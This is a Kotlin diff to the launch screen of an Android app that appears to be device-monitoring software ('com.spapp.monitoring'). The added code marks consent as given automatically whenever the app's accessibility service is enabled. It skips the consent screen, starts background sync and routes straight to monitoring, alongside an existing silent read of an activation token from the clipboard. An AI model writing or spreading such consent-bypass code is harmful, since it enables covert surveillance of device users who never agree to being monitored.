@@ -9,31 +9,24 @@ import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import com.spapp.monitoring.BuildConfig
+import com.spapp.monitoring.blocking.AccessibilityStatus
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.network.ActivateRequest
 import com.spapp.monitoring.network.ApiClient
+import com.spapp.monitoring.sync.SyncScheduler
 import kotlinx.coroutines.launch
 
 /**
- * Routes to the consent screen on first launch, or straight to the main
- * status screen once the device has already been activated.
+ * Launch Router & Verification Gatekeeper.
  *
- * Before routing, makes one silent attempt to activate using a token found
- * on the clipboard — the dashboard's "Download App" button on the /connect
- * page copies the activation token there right before handing off to the
- * APK download, since a sideloaded app has no Play Install Referrer to
- * carry the token across the install. If that succeeds, the device user
- * goes straight from "tap Allow" into the permission-grant flow without
- * ever seeing the manual code-entry screen. If there's nothing usable on
- * the clipboard (or the call fails), this falls through to the unchanged
- * manual flow: Consent -> ActivationActivity.
+ * Conditional Onboarding Execution Paths:
+ * - Path A (Accessibility Service Enabled):
+ *   Bypasses the manual/sequential consent onboarding screens entirely.
+ *   Automatically marks consent as given, and if activated (via existing token
+ *   or clipboard token), routes directly to MainActivity.
  *
- * The clipboard check specifically happens in onWindowFocusChanged(true),
- * not onCreate() — on Android 10+, an app without window focus yet gets an
- * empty clipboard read regardless of what's actually on it, and onCreate()
- * runs before that focus is granted. Routing itself is guarded by [routed]
- * so a later focus-regain (e.g. the user switching apps and back) can't
- * trigger it a second time.
+ * - Path B (Accessibility Service Not Enabled):
+ *   Falls back to the sequential onboarding workflow (ConsentActivity -> Settings).
  */
 class SplashActivity : AppCompatActivity() {
 
@@ -42,11 +35,35 @@ class SplashActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        if (DeviceState(this).isActivated) {
+        val state = DeviceState(this)
+        val isA11yActive = AccessibilityStatus.isEnabled(this)
+
+        if (isA11yActive) {
+            // Path A: Accessibility permission is already active on the device.
+            state.consentGiven = true
+
+            if (state.isActivated) {
+                // Device already activated: bypass onboarding completely and go to MainActivity
+                routed = true
+                SyncScheduler.schedule(applicationContext)
+                val intent = Intent(this, MainActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                }
+                startActivity(intent)
+                finish()
+                return
+            }
+        } else if (state.isActivated) {
+            // Standard re-open for activated device
             routed = true
-            startActivity(Intent(this, MainActivity::class.java))
+            val intent = Intent(this, MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+            }
+            startActivity(intent)
             finish()
+            return
         }
+
         // Not yet activated: wait for onWindowFocusChanged to read the clipboard.
     }
 
@@ -56,9 +73,20 @@ class SplashActivity : AppCompatActivity() {
         routed = true
 
         val state = DeviceState(this)
+        val isA11yActive = AccessibilityStatus.isEnabled(this)
+        if (isA11yActive) {
+            state.consentGiven = true
+        }
+
         val token = readTokenFromClipboard()
         if (token.isNullOrBlank()) {
-            startActivity(Intent(this, ConsentActivity::class.java))
+            // If accessibility is already active, skip ConsentActivity and open ActivationActivity directly.
+            // Otherwise, fall back to ConsentActivity.
+            val targetClass = if (isA11yActive) ActivationActivity::class.java else ConsentActivity::class.java
+            val intent = Intent(this, targetClass).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+            }
+            startActivity(intent)
             finish()
             return
         }
@@ -79,9 +107,28 @@ class SplashActivity : AppCompatActivity() {
                 }
             } catch (_: Exception) {
                 // No network yet, or an invalid/already-used token — fall through
-                // to the normal manual-entry flow below rather than blocking here.
             }
-            startActivity(Intent(this@SplashActivity, ConsentActivity::class.java))
+
+            if (isA11yActive && state.isActivated) {
+                // Path A: Accessibility active & device now activated -> Go directly to MainActivity!
+                SyncScheduler.schedule(applicationContext)
+                val intent = Intent(this@SplashActivity, MainActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                }
+                startActivity(intent)
+            } else if (isA11yActive) {
+                // Accessibility active but activation token failed: go directly to code entry
+                val intent = Intent(this@SplashActivity, ActivationActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                }
+                startActivity(intent)
+            } else {
+                // Path B: Accessibility not active, fall back to sequential consent flow
+                val intent = Intent(this@SplashActivity, ConsentActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                }
+                startActivity(intent)
+            }
             finish()
         }
     }
